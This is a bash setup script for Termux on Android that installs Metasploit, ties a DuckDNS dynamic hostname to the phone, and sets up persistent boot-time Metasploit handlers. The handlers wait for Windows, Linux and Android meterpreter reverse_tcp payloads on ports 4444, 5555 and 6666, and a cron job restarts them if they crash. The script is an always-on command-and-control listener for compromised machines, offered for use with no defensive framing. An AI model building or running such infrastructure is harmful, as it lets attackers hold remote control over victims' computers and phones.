#!/data/data/com.termux/files/usr/bin/bash

# Colors for output
GREEN="\e[32m"
YELLOW="\e[33m"
RED="\e[31m"
RESET="\e[0m"

echo -e "${GREEN}🚀 Starting Termux VPS Auto-Setup...${RESET}"

# Step 1: Update & Install Packages
echo -e "${YELLOW}📦 Installing required packages...${RESET}"
apt update && apt upgrade -y
pkg install curl nano cronie openssh wget unstable-repo metasploit -y

# Step 2: Auto-Install Termux:Boot (if not installed)
echo -e "${YELLOW}🔄 Checking for Termux:Boot...${RESET}"
if [ ! -d "/data/data/com.termux.boot" ]; then
    echo -e "${YELLOW}📥 Downloading & Installing Termux:Boot...${RESET}"
    termux-open-url "https://f-droid.org/repo/com.termux.boot_7.apk"
    echo -e "${RED}⚠️ Install Termux:Boot manually, then restart Termux.${RESET}"
    exit 1
fi

# Step 3: Get DuckDNS Info
echo -e "${YELLOW}🔗 Setting up DuckDNS...${RESET}"
read -p "Enter your DuckDNS subdomain (without .duckdns.org): " DUCKSUB
read -p "Enter your DuckDNS token: " DUCKTOKEN

# Create the DuckDNS update script
mkdir -p ~/.termux-ddns
cat <<EOF > ~/.termux-ddns/update.sh
#!/data/data/com.termux/files/usr/bin/bash
curl -k "https://www.duckdns.org/update?domains=$DUCKSUB&token=$DUCKTOKEN&ip="
EOF

chmod +x ~/.termux-ddns/update.sh

# Set up cron job for auto-updating DuckDNS
echo -e "${YELLOW}🕒 Setting up DuckDNS auto-update every 5 minutes...${RESET}"
(crontab -l 2>/dev/null; echo "*/5 * * * * ~/.termux-ddns/update.sh >/dev/null 2>&1") | crontab -
termux-job-scheduler --interval 5 --script ~/.termux-ddns/update.sh

# Step 4: Create Metasploit Auto-Start Script (Multiple Listeners)
echo -e "${YELLOW}💀 Configuring Metasploit listeners...${RESET}"
mkdir -p ~/.termux-autostart
cat <<EOF > ~/.termux-autostart/msf_autostart.sh
#!/data/data/com.termux/files/usr/bin/bash
termux-wake-lock
msfconsole -q -x "
use exploit/multi/handler; set payload windows/meterpreter/reverse_tcp; set LHOST $DUCKSUB.duckdns.org; set LPORT 4444; exploit -j;
use exploit/multi/handler; set payload linux/x64/meterpreter/reverse_tcp; set LHOST $DUCKSUB.duckdns.org; set LPORT 5555; exploit -j;
use exploit/multi/handler; set payload android/meterpreter/reverse_tcp; set LHOST $DUCKSUB.duckdns.org; set LPORT 6666; exploit -j;
"
EOF

chmod +x ~/.termux-autostart/msf_autostart.sh

# Step 5: Set Up Termux Boot
echo -e "${YELLOW}🔄 Setting up Termux Boot script...${RESET}"
mkdir -p ~/.termux/boot
cp ~/.termux-autostart/msf_autostart.sh ~/.termux/boot/

# Step 6: Set Up Auto-Restart if Metasploit Crashes
echo -e "${YELLOW}🔁 Setting up Metasploit auto-restart...${RESET}"
(crontab -l 2>/dev/null; echo "*/5 * * * * pgrep msfconsole > /dev/null || ~/.termux-autostart/msf_autostart.sh") | crontab -

echo -e "${GREEN}✅ Setup Complete! Restart your phone and open Termux once to activate Termux:Boot.${RESET}"
